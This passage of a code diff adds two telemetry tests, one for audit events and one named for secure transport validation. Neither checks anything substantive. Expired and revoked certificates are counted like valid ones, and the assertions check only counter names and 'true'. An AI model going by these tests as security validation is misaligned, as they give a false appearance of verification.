+  let security_meter = MeterProvider::get_meter(MeterProvider::default(), "audit-metrics")
+  let audit_counter = Meter::create_counter(security_meter, "audit.events", Some("Audit events"), Some("events"))
+  let integrity_check_counter = Meter::create_counter(security_meter, "integrity.checks", Some("Integrity checks"), Some("checks"))
+  
+  // Simulate audit trail scenarios
+  let audit_scenarios = [
+    ("user.login", "user123", "success", "web.application"),
+    ("data.access", "user456", "authorized", "api.service"),
+    ("config.change", "admin", "success", "admin.panel"),
+    ("data.export", "user789", "authorized", "reporting.service"),
+    ("permission.grant", "admin", "success", "user.management"),
+    ("system.backup", "system", "success", "backup.service"),
+    ("security.scan", "security.service", "completed", "vulnerability.scanner"),
+    ("log.review", "auditor", "completed", "audit.system")
+  ]
+  
+  // Process audit scenarios
+  for (event_type, actor, result, system_component) in audit_scenarios {
+    let audit_attrs = Attributes::new()
+    Attributes::set(audit_attrs, "event.type", StringValue(event_type))
+    Attributes::set(audit_attrs, "actor", StringValue(actor))
+    Attributes::set(audit_attrs, "result", StringValue(result))
+    Attributes::set(audit_attrs, "system.component", StringValue(system_component))
+    Attributes::set(audit_attrs, "audit.timestamp", StringValue(Clock::now_unix_nanos(Clock::system()).to_string()))
+    Attributes::set(audit_attrs, "audit.id", StringValue("audit-" + Clock::now_unix_nanos(Clock::system()).to_string()))
+    
+    // Log audit event
+    let audit_record = LogRecord::new_with_context(
+      Info,
+      Some("Audit event: " + event_type + " by " + actor),
+      Some(audit_attrs),
+      Some(Clock::now_unix_nanos(Clock::system())),
+      Some(Clock::now_unix_nanos(Clock::system()) + 400000L),
+      Some("audit-trace-id"),
+      Some("audit-span-id"),
+      None
+    )
+    
+    Logger::emit(logger, audit_record)
+    
+    // Track audit events
+    Counter::add(audit_counter, 1.0)
+    
+    // Simulate integrity check
+    Counter::add(integrity_check_counter, 1.0)
   }
+  
+  // Verify audit metrics
+  assert_eq(audit_counter.name, "audit.events")
+  assert_eq(integrity_check_counter.name, "integrity.checks")
+  assert_true(true)
+}
+
+test "secure_transport_validation" {
+  // Test secure transport validation and monitoring
+  let security_meter = MeterProvider::get_meter(MeterProvider::default(), "transport-metrics")
+  let secure_connection_counter = Meter::create_counter(security_meter, "secure.connections", Some("Secure connections"), Some("connections"))
+  let certificate_validation_counter = Meter::create_counter(security_meter, "certificate.validations", Some("Certificate validations"), Some("validations"))
+  
+  // Simulate secure transport scenarios
+  let transport_scenarios = [
+    ("HTTPS", "TLS-1.3", "valid", "*.example.com"),
+    ("WSS", "TLS-1.2", "valid", "api.example.com"),
+    ("HTTPS", "TLS-1.3", "expired", "old.example.com"),
+    ("HTTPS", "TLS-1.3", "self.signed", "internal.example.com"),
+    ("WSS", "TLS-1.2", "valid", "ws.example.com"),
+    ("HTTPS", "TLS-1.3", "revoked", "compromised.example.com"),
+    ("HTTPS", "TLS-1.2", "valid", "legacy.example.com"),
+    ("WSS", "TLS-1.3", "valid", "realtime.example.com")
+  ]
+  
+  // Process transport scenarios
+  for (protocol, tls_version, cert_status, hostname) in transport_scenarios {
+    let transport_attrs = Attributes::new()
+    Attributes::set(transport_attrs, "protocol", StringValue(protocol))
+    Attributes::set(transport_attrs, "tls.version", StringValue(tls_version))
+    Attributes::set(transport_attrs, "certificate.status", StringValue(cert_status))
+    Attributes::set(transport_attrs, "hostname", StringValue(hostname))
+    Attributes::set(transport_attrs, "connection.timestamp", StringValue(Clock::now_unix_nanos(Clock::system()).to_string()))
+    
+    // Track secure connections
+    Counter::add(secure_connection_counter, 1.0)
+    
+    // Track certificate validations
+    Counter::add(certificate_validation_counter, 1.0)
+  }
+  
+  // Verify transport metrics
+  assert_eq(secure_connection_counter.name, "secure.connections")
+  assert_eq(certificate_validation_counter.name, "certificate.validations")
+  assert_true(true)
 }
